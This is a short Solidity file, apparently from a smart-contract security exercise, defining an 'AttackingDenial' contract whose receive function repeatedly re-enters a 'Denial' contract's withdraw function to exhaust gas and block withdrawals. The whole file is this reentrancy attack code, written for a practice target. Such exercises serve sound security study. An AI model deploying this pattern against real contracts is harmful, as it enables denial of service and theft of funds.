// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial private denial;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
        denial = Denial(_contractAddress);
    }

    receive () external payable {
        require(gasleft() > 1000000 || msg.value > 0);
        denial.withdraw();
    }

    //Code me!
}
